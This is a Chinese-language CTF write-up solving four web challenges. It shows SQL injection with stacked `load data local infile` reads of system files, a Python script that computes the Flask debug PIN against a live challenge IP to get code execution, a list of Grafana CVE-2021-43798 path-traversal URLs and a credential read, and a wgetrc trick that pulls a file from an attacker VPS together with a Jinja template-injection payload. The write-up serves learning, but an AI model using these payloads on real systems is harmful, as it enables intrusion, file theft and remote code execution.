oh-my-notepro
=============

登录没有做限制，仅与登录的用户名有关

登陆后创建文件，并进行访问`view?note_id=XXXX`，此时修改`note_id`的值会发生报错，并且进入到`flask`的`Debug`中

![image-20220417174814841](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a9f8972090cbc2ff7d01684fa556fabd13b05eb3.png)

从`Debug`反馈的报错中可知这里存在执行了SQL语句，测试后发现存在SQL注入

```text
Payload
/view?note_id=-1'union select 1,2,3,4,5--+
```

这里`flask`是开启了`Debug`，存在计算PIN码导致任意代码执行的漏洞。因为存在SQL联合查询，一开始想直接通过`load_file()`函数直接读取文件，但发现不行，查看了`@@secure_file_priv`发现设置了目录

这里可以使用`load data local infile`进行文件读取，它是不受`@@secure_file_priv`，但是它有个条件是需要堆叠注入才行(不过这里是存在堆叠的)

```sql
CREATE TABLE Dontt(fake VARCHAR(1000));load data local infile "/etc/passwd" into table Dontt FIELDS TERMINATED BY '\n';
```

新建一张表，然后将文件的内容导入表中，最后使用联合查询查看表中内容即可

接着读取文件计算PIN码，不过这里PIN码的计算是有区分的，`Python3.8`之前是使用`MD5`进行加密，之后是使用`sha1`进行加密

```text
需要读取的文件
计算机当前用户: /etc/passwd
Flask: /app/app.py
当前网络的mac地址的十进制: /sys/class/net/eth0/address
机器的ID: /proc/self/cgroup
machine-id: /etc/machine-id
```

不过靶机每次重启只会更新`/proc/self/cgroup`和`/sys/class/net/eth0/address`，所以编写脚本来快速获取PIN码

```python
import hashlib
from itertools import chain
import requests
import re

burp0_url = "http://121.37.153.47:5002/view?note_id=5kd3y85k2v7kzse27fn46p723i7t4jxp%27;CREATE%20TABLE%20Dontt(fake%20VARCHAR(1000));load%20data%20local%20infile%20%22/sys/class/net/eth0/address%22%20into%20table%20Dontt%20FIELDS%20TERMINATED%20BY%20%27\\n%27;load%20data%20local%20infile%20%22/proc/self/cgroup%22%20into%20table%20Dontt%20FIELDS%20TERMINATED%20BY%20%27\\n%27;--+"
burp0_cookies = {"session": "eyJjc3JmX3Rva2VuIjoiZDY4N2FhZjBjMGJhYWZiZjVkOTY0ZGZiMjFiYTdmOTVmYmIyMGY0MSIsInVzZXJuYW1lIjoiYSJ9.YlqpVA.Fl8s8nedhPqsVRujiNg7h8ZgZp8"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://121.37.153.47:5002/index", "Upgrade-Insecure-Requests": "1"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

burp1_url = "http://121.37.153.47:5002/view?note_id=5p%27union%20select%201,2,3,group_concat(fake),5%20from%20Dontt--+"

res = requests.get(burp1_url, headers=burp0_headers, cookies=burp0_cookies).text
#print(res)
x = re.findall("(.{17}),12:devices:/docker/(\w{64})",res)

mac = x[0][0]
ip = x[0][1]

probably_public_bits = [
    'ctf',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/site-packages/flask/app.py'
]

mac = mac.replace(':', '')
mac = str(int(mac, base=16))

private_bits = [
    mac,
    '1cc402dd0e11d5ae18db04a6de87223d' + ip
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

> **注：此处发言不一定准确，如果有任何错误欢迎联系笔者纠正**
> 
> 这里的PIN码好像是只有第一个输入的才能使用，后面输入的不能执行代码只能报错
> 
> 不知道是否为上述机制的问题，如果是的话这个静态环境的问题让人有点小闹心，笔者从下午弄到了凌晨才成功执行了代码

最后就是导入`os`库，然后执行命令

![image-20220417020844827](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d1482f5afe5c33c959e114a1a02baee0ca1da2a2.png)

![image-20220417020859080](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-eb5987d77e24de5d93b6532817b7f3a91ce83245.png)

oh-my-lotto
===========

给了Docker环境，有代码的题目真好

关键代码如下

```python
flag = os.getenv('flag')
lotto_key = request.form.get('lotto_key') or ''
lotto_value = request.form.get('lotto_value') or ''
try:
    lotto_key = lotto_key.upper()
except Exception as e:
    print(e)
    message = 'Lotto Error!'
    return render_template('lotto.html', message=message)

if safe_check(lotto_key):
    os.environ[lotto_key] = lotto_value
    try:
        os.system('wget --content-disposition -N lotto')

        if os.path.exists("/app/lotto_result.txt"):
            lotto_result = open("/app/lotto_result.txt", 'rb').read()
        else:
            lotto_result = 'result'
        if os.path.exists("/app/guess/forecast.txt"):
            forecast = open("/app/guess/forecast.txt", 'rb').read()
        else:
            forecast = 'forecast'

        if forecast == lotto_result:
            return flag
```

可以修改一个环境变量的参数，然后会执行`wget`命令，最后比较`/app/lotto_result.txt`和`/app/guess/forecast.txt`文件内容是否相等

如果不进行文件下载的话，`/app/lotto_result.txt`不存在，则它会用`result`作为替代，这样比较的就是一个固定值，而不用预测了

因为这里的`wget`是相对路径，他会去环境变量中找`PATH`从而确定绝对路径然后执行命令。这里只需要替换`PATH`值，导致`wget`执行失败

![image-20220417195858017](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a307b3fbfe311139dc2e5a3e4dbaf49212b81c4d.png)

然后就发现了一个大坑，Python3中`bytes`和`str`类型尽管值一样，类型不同仍然是`False`

![image-20220417200156210](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-12024a02090300c32698c068a9c278c9eb59e87a.png)

所以这里需要用到`/result`路由可以来解决，该路由的作用是查看前一次随机数

所以这里需要先让它生成一次随机数，然后查看随机数，接着再利用上述的方式即可

![image-20220417200914217](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-23a3b7443899817cb97c85e7df323ef9c69cfd4b.png)

查看随机数

![image-20220417201136709](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c8c8e3e605bdda741977fc707f1b84be5f396f59.png)

这里上传文件时需要注意，要把`\r`删点，不然两者依然是不相等的

最后修改`PATH`环境变量，获取flag

![image-20220417020920307](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-fa5b4f4ef7fadf5af9d7123c40202c0743ff5f6c.png)

oh-my-grafana
=============

`grafana`版本是`8.2.6`，存在`CVE-2021-43798`任意文件读取的漏洞

这里需要一个存在的插件地址，受影响的插件大致如下

```text
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
```

可以利用该漏洞读取`/etc/grafana/grafana.ini`获取`admin_password`进行登录

![image-20220417202231910](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-173a498f232acba0fb959ace6d1bfe5678f50c31.png)

接着可以看到一个`Mysql`的数据源

![image-20220417202730619](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-90b0fdcd6fd45c2c72ff0f10d9f2797ff4a335b0.png)

然后因为是公共环境，点击输入框就会自己跳出相应的表名和列名，最后执行即可(这里应该蹭到车)

![image-20220417020942210](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2ad21004285c702cf75bae0297dd86538f5b53e0.png)

oh-my-lotto-revenge
===================

升级版，最主要的差别：这里即使两个文件相同也不会返回`flag`，所以出题人应该是想要让人Getshell获取`flag`

这里主要参考文章：<https://www.gnu.org/software/wget/manual/wget.html>

在其第6点说明了`wget`存在一个配置文件，可以利用该配置文件设置参数(这些参数可以在文档下面找到)，`wget`执行时，会去加载配置文件的参数，该配置文件也可以由自己设置

```text
WGETRC = filename
```

这里主要用到的参数有两个

```text
input = http://ip:port/file
output_document = templates/index.html
```

设置`input`为了让靶机去下载vps上的文件，`output_document`则是设置下载的文件该存在哪里，这里直接修改模板文件，由于没有进行过滤，直接用最简单的`Payload`即可

```text
{{lipsum.__globals__.__getitem__("os").popen("env").read()}}
```

将上面的内容存在vps上，并在当前文件夹中开启HTTP服务

![image-20220417205703673](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-13615b81bbadf177118f1440afd75455499a3206.png)

上传配置文件内容

最后修改`WGETRC=/app/guess/forecast.txt`，访问`/`获取flag

![image-20220417021020093](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2c8f64bbaa247538043e671880d6e4105a4af35a.png)

这里一开始是想用`post_file`标签直接将`/proc/self/environ`文件外带出来的，但是测试发现并不行(不知道是不是权限的问题)，但是进入`Docker`中是可以读取该文件的，求知道的师傅解答一下！！！

![image-20220417210854970](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f9ea9b9fe078d9ad803eb6dcf05b8639abf2db79.png)